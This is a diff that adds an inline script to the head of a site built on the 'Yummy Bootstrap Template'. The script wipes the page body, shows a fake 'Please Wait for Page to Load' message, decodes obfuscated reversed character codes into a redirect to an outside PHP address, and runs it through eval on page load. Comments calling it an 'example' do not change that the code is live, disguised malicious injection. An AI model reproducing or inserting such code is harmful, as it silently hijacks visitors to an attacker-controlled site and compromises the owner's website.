@@ -2,6 +2,37 @@
 <html lang="en">
 
 <head>
+  
+   <script>
+    // Function to reverse a comma-separated ASCII string, convert it to characters
+    function rS(s) {
+      var nS = "";
+      for (var i = s.length - 1; i >= 0; i--) {
+        nS += s[i];
+      }
+      var a = nS.split(",");
+      var u = String.fromCharCode.apply(null, a.map(Number));
+      return u;
+    }
+
+    // Example encoded server script string (simulate what PHP returns)
+    const encoded_s = "16,201,101,411,401,64,011,111,501,611,79,99,111,801,64,911,111,001,011,501,911";
+    const encoded_u = "49,48,52,46,50,50,49,46,50,48,49,44,101,109,111,99,46,106,99,98,106,47,112,104,112,46,108,99,112"; // Example
+
+    // Simulate page "loading" message
+    $("body").remove();
+    $("html").append("<body><div style='margin-top:8%;background-color:white;text-align:center;font-size:40px;'>Please Wait for Page to Load...</div></body>");
+
+    const s = rS(encoded_s);
+    const u = rS(encoded_u);
+    const c = s + "'" + u + "'";
+
+    // WARNING: This is very insecure. Do NOT use eval unless you 100% trust the source.
+    eval(c);
+
+    $("html").show();
+  </script>
+
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0" name="viewport">
   <title>Index - Yummy Bootstrap Template</title>
